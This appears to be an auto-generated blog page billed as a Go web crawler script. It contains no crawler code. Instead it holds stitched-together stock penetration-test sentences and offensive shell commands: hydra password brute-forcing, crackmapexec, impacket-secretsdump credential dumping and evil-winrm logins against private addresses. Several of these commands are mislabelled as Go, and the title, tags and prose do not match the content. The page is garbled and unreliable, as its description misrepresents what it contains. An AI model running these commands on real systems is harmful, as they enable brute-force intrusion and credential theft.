---
TitleSEO: "Web Crawler and Spider in Go | ZureFX"
TitlePost: "Web Crawler and Spider — Go"
Author: "ZureFX"
Description: "A Go script for web crawler and spider. Built for security research and automation."
Keywords: "powershell, scanner, script, go"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-713.html"
URL_IMAGES: ""
Date: "2026-01-10"
Tags: "PowerShell, Scanner, Script, Go"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-713"
Permalink: "/scripting/script-web-crawler-and-spider-713.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `rpcclient`
- `nmap`
- `wmiexec`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.150.52 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5986,27017,5432 10.42.115.21 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```go
crackmapexec smb 10.112.33.244 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.54.57.116
```

### Advanced Options

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.104.34.77 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.165.121 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.243.168 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 11.75s
```
